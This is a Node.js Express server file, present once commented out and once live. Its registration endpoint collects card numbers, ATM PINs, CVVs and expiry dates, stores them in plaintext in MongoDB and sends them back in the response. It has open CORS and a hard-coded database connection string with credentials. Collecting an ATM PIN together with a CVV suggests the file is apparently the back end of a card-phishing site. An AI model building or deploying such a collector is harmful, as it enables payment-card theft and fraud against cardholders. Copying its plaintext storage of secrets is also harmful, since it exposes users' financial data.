// const express = require("express");
// const mongoose = require("mongoose");
// const cors = require("cors");

// const app = express();
// const PORT = process.env.PORT || 5000;

// // Middleware
// app.use(cors()); // Enable CORS for all routes
// app.use(express.json()); // Parse JSON bodies

// // MongoDB connection
// mongoose
//   .connect(
//     "mongodb+srv://password:passwordpassword@cluster0.m74f9hr.mongodb.net/",
//     {
//       useNewUrlParser: true,
//       useUnifiedTopology: true,
//     }
//   )
//   .then(() => console.log("MongoDB connected"))
//   .catch((err) => console.error("MongoDB connection error:", err));

// // Define a schema for the registration data
// const Schema = mongoose.Schema;
// const userSchema = new Schema({
//   cardNumber: String,
//   atmPin: String,
//   cvv: String,
//   expiryMonth: String,
//   expiryYear: String,
//   acceptTerms: Boolean,
// });

// // Create a model from the schema
// const User = mongoose.model("User", userSchema);

// // Define your API endpoints
// app.post("/api/register", async (req, res) => {
//   try {
//     const { cardNumber, atmPin, cvv, expiryMonth, expiryYear, acceptTerms } =
//       req.body;

//     // Perform input validation here (for example, check if fields are not empty)
//     // Note: You should also add validation for expiryMonth and expiryYear if necessary

//     const newUser = new User({
//       cardNumber,
//       atmPin,
//       cvv,
//       expiryMonth,
//       expiryYear,
//       acceptTerms,
//     });

//     const savedUser = await newUser.save();
//     res
//       .status(201)
//       .send({ message: "User registered successfully", data: savedUser });
//   } catch (error) {
//     console.error("Error registering user:", error);
//     res
//       .status(500)
//       .send({ message: "Error registering user", error: error.message });
//   }
// });

// // Start the server
// app.listen(PORT, () => {
//   console.log(`Server running on port ${PORT}`);
// });


const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors()); // Enable CORS for all routes
app.use(express.json()); // Parse JSON bodies

// MongoDB connection
mongoose
  .connect(
    "mongodb+srv://password:passwordpassword@cluster0.m74f9hr.mongodb.net/",
    {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    }
  )
  .then(() => console.log("MongoDB connected"))
  .catch((err) => console.error("MongoDB connection error:", err));

// Define a schema for the registration data
const Schema = mongoose.Schema;
const userSchema = new Schema({
  cardNumber: String,
  atmPin: String,
  cvv: String,
  expiryMonth: String,
  expiryYear: String,
  acceptTerms: Boolean,
});

// Create a model from the schema
const User = mongoose.model("User", userSchema);

// Define API endpoint for registration
app.post("/api/register", async (req, res) => {
  try {
    const { cardNumber, atmPin, cvv, expiryMonth, expiryYear, acceptTerms } =
      req.body;
    const newUser = new User({
      cardNumber,
      atmPin,
      cvv,
      expiryMonth,
      expiryYear,
      acceptTerms,
    });

    const savedUser = await newUser.save();
    res
      .status(201)
      .send({ message: "User registered successfully", data: savedUser });
  } catch (error) {
    console.error("Error registering user:", error);
    res
      .status(500)
      .send({ message: "Error registering user", error: error.message });
  }
});

// Define a GET route for the root path
app.get("/", (req, res) => {
  res.send("Welcome to the API!");
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
